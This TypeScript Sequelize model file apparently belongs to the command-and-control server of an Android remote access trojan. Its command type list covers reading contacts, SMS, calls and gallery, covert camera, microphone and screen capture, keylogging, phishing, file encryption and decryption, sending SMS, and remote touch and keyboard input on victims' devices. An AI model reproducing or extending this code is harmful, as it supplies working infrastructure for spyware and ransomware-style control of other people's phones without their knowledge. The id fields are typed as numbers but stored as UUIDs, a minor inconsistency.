// Command Model - Theo dõi lệnh đã gửi đến thiết bị
import { Table, Column, Model, DataType, PrimaryKey, Default, AllowNull, ForeignKey, BelongsTo } from 'sequelize-typescript';
import { Optional } from 'sequelize';
import { Device } from './Device';
import { User } from './User';

// Command status
export enum CommandStatus {
  PENDING = 'pending',
  SENT = 'sent',
  OK = 'ok',
  ERROR = 'error',
  TIMEOUT = 'timeout'
}

// Available command types (matching Android APK)
export type CommandType =
  | 'contacts' | 'sms' | 'calls' | 'gallery'
  | 'main-camera' | 'selfie-camera' | 'microphone' | 'screenshot'
  | 'toast' | 'vibrate' | 'play-audio' | 'stop-audio'
  | 'clipboard' | 'sendSms' | 'keylogger-on' | 'keylogger-off'
  | 'open-url' | 'phishing' | 'encrypt' | 'decrypt'
  | 'apps' | 'file-explorer' | 'all-sms' | 'popNotification'
  | 'start-screen-stream' | 'stop-screen-stream' | 'touch-event' | 'keyboard-event';

export interface CommandAttributes {
  id: number;
  device_id: number;
  command: CommandType;
  params: any; // JSON params
  status: CommandStatus;
  response?: any | null; // JSON response from device
  error_message?: string | null;
  created_by: number;
  created_at: Date;
  updated_at: Date;
  executed_at?: Date | null;
}

export interface CommandCreationAttributes extends Optional<CommandAttributes, 'id' | 'created_at' | 'updated_at' | 'response' | 'error_message' | 'executed_at'> {}

@Table({
  tableName: 'commands',
  timestamps: true,
  createdAt: 'created_at',
  updatedAt: 'updated_at',
})
export class Command extends Model<CommandAttributes, CommandCreationAttributes> {
  @PrimaryKey
  @Default(DataType.UUIDV4)
  @Column(DataType.UUID)
  id!: number;

  @ForeignKey(() => Device)
  @AllowNull(false)
  @Column(DataType.UUID)
  device_id!: number;

  @BelongsTo(() => Device)
  device?: Device;

  @AllowNull(false)
  @Column(DataType.STRING(100))
  command!: CommandType;

  @AllowNull(false)
  @Column(DataType.JSON)
  params!: any;

  @AllowNull(false)
  @Default(CommandStatus.PENDING)
  @Column(DataType.ENUM(...Object.values(CommandStatus)))
  status!: CommandStatus;

  @Column(DataType.JSON)
  response?: any | null;

  @Column(DataType.TEXT)
  error_message?: string | null;

  @ForeignKey(() => User)
  @AllowNull(false)
  @Column(DataType.UUID)
  created_by!: number;

  @BelongsTo(() => User)
  creator?: User;

  @Column(DataType.DATE)
  executed_at?: Date | null;

  @Column(DataType.DATE)
  created_at!: Date;

  @Column(DataType.DATE)
  updated_at!: Date;
}

export default Command;
